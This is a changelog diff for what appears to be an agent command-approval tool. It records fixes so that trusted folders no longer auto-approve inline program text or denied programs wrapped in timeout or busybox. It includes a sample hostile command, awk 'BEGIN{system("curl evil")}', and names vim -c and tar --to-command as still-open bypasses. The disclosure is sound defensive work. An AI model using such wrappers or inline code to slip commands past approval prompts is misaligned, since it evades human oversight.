@@ -7,6 +7,21 @@ Dates are UTC.
 ## [Unreleased]
 
 ### Added
+- **A trusted folder no longer auto-approves inline program text** (gh #365). A
+  trusted folder means trusting the code *in* it, so a command that runs a
+  program string typed on the command line should ask — an earlier fix closed
+  that for evaluator flags (`python3 -c`, `node -e`), but several tools carry the
+  same code as a plain argument instead: `awk 'BEGIN{system("curl evil")}'`,
+  `gawk`/`mawk`/`nawk`, `osascript -e`, `irb -e`. Those now ask. A program that
+  arrives as a **file in the folder** stays on the trust fast path
+  (`awk -f scripts/run.awk`), and ordinary `sed` edits are untouched — only
+  `sed`'s `e` flag, which re-runs the substitution result as a command, asks,
+  because refusing `sed` wholesale would train people to approve without
+  reading. The same review turned up a sharper hole: a denied program behind an
+  exec wrapper (`timeout 5 curl …`, `busybox wget …`) auto-approved because the
+  wrapper was the program and the denied name was just an argument. That is
+  closed too. Editor command flags (`vim -c`) and `tar --to-command` are named as
+  still open rather than implied fixed.
 - **Preset declarations are load-bearing** (gh #294). Two provider presets
   pointed at a local server and could not list their models: the manifest
   reached only the internet host, and a loopback address is refused outright
